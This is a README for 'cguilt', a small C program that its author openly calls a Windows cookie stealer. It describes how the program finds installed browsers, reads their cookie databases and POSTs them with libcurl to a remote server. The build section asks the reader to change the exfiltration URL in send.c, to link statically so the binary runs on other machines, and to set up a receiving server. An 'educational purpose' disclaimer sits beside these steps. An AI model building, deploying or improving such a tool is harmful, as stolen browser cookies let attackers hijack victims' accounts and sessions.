# cguilt
Kinda experiment field with cookies in Windows. As it is said above, it's just for educational purpose only. Have dependencies, also runtime one. So, to build it you'll need **libcurl** and **sqlite3**. Also libcurl should be static linked, because otherwise binary won't work on other machines. The explanation here is because the **libcurl.dll** is requred in runtime, so you need to link it static somehow.

### # faq
**Q.** *What is this exactly and how it works?*

**A.** It's really simple cookie stealler, which, as I already said twice, was written just for fun and some practice of course. It's just checks what browsers are currently installed at the local machine and reads it's cookies database files, then send them to other server through curl with api requests.

**Q.** *How can I use it?*

**A.** Just build it from sources like many other programs. In fact, I don't think it is really usefull stuff, but if you want - you're welcome. Also, this thing is still pretty raw and I actually have not yet compitely tested it on other machines. But issues here is always open, so if you want to improve for some reason...

### # quo vadis?
As it is can be somehow harmful, the main purpose of this thing is practice and education. That's all...

### # build
Install **libcurl** and **sqlite3** libs. Before compilation change destination server adress in 40th string in ***send.c***:
```c
curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
```
Also you need a serverside to accept the incoming POST requests. Enjoy.

Compile everything. Btw you need somehow link libcurl as static. Purpose of that is written above.
```bash
$ gcc -o <name> main.c send.c `pkg-config --cflags --libs sqlite3 libcurl`
```
